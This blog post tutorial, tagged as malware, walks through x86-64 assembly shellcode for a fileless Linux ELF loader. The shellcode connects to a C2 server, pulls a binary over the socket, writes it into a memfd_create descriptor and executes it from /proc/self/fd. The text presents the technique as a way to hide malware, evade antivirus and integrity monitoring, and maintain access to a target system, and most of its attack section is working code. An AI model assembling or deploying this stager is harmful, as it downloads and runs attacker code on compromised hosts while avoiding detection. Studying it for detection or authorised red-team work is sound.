---
title: Remote in-memory ELF loader
categories: [Programming]
tags: [assembly, malware]
---

Fileless malware distribution is gaining popularity.
What is not surprisingly, because the work of such programs leaves almost no traces.
Moreover, since the very beginning hackers always searched for ways to stay anonymous and hide their malware on the system.
Thats why we focused on deep diving into this subject and came with the idea.
In Windows, there is **Reflective DLL Injection** which allows to execute malware right into the memory of the compromised process, but on Linux there is no such existing implementation.
So, then we thought, why not to use different ways of executing ELF files?

We found out that there is a technique of creating temporary filesystem using `/dev/shm`, but this actually does not provide us what we want.
Out goal is to execute ELF file right into the memory, not from the disk.
And then, after reading this [very interesting article](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html) we decided to improve method described in it.
As we all know it is possible to create different file descriptor and write data to it.
This file descriptor will appear in `/proc/<pid/fd/<fd>` and then can be executed as a file.

Fortunately, `procfs` does not exist on disk and kernel creates it in the memory which is a good thing for us:

```
The /proc filesystem contains a illusionary filesystem.
It does not exist on a disk. Instead, the kernel creates it in memory.
```

*3.7. The /proc filesystem*

So, the concept of the whole process is:

**1.** Read ELF data from socket
**2.** Map it into the memory
**3.** Write to the created file descriptor
**4.** Execute it from `/proc/self/fd/<fd>`

## Shellcode

Let's begin writing our shellcode.

First step is to set up socket for further communication:

```nasm
.equ SYS_SOCKET     0x29
.equ AF_INET        0x2
.equ SOCK_STREAM    0x1

_sys_socket:
    push SYS_SOCKET
    pop rax
    cdq
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    syscall
```

Now, we are ready to connect to our C2 server:

```nasm
_sys_connect:
    xchg rdi, rax
    movabs rcx, C2_ADDR
    push rcx
    mov rsi, rsp
    push 0x10
    pop rdx
    push 0x2a
    pop rax
    syscall
```

Lets imagine that we now read ELF file length and have it in the `r12` register.
Moreover, we have already allocated memory using `mmap` and have address pointing to it in `r15`.
Then, we have already read ELF data to the allocated memory and the next step is to create file descriptor.
For this purpose we are gonna use `memfd_create` system call:

```nasm
.equ SYS_MEMFD 0x13f
.equ FILE_SIZE 0x8

_sys_memfd:
    xor rax, rax
    push rax
    push rsp
    sub rsp, FILE_SIZE
    mov rdi, rsp
    push SYS_MEMFD
    pop rax
    xor rsi, rsi
    syscall
```

Then we save our file descriptor to `r14` via `push rax; pop r14` and then we need to write our ELF data from the allocated memory right to the file descriptor.
After all these steps done, we need to concatenate `/proc/self/fd/` and our file descriptor. There are different ways to do this, but in our case we'll use stack:

```nasm
add rsp, 16
mov qword ptr [rsp], 0x6f72702f
mov qword ptr [rsp+4], 0x65732f63
mov qword ptr [rsp+8], 0x662f666c
mov qword ptr [rsp+12], 0x002f64
```

Then we need to convert our file descriptor to the string and append it to the stack above. We'll pass this step.

Now, we are ready to execute our file descriptor using `execve`:

```nasm
.equ SYS_EXECVE 0x3b

_sys_execve:
    lea rdi, [rsp]
    push SYS_EXECVE
    pop rax
    cdq
    push rdx
    push rdi
    mov rsi, rsp
    syscall
```

First instruction puts path `/proc/self/fd/<fd>` to the first argument of `execve`.

As the result, we'll get our ELF file executed. And we didn't even touch the disk!

## Conclusion

Fileless loading of ELF files in Linux is a useful technique when doing
penetration testing. This is a fairly quiet way to
resist a wide range of anti-virus protection, control systems
integrity and monitoring systems that monitor content changes
hard drive. In this way, access to the target can be easily maintained.
system, leaving a minimum of traces.
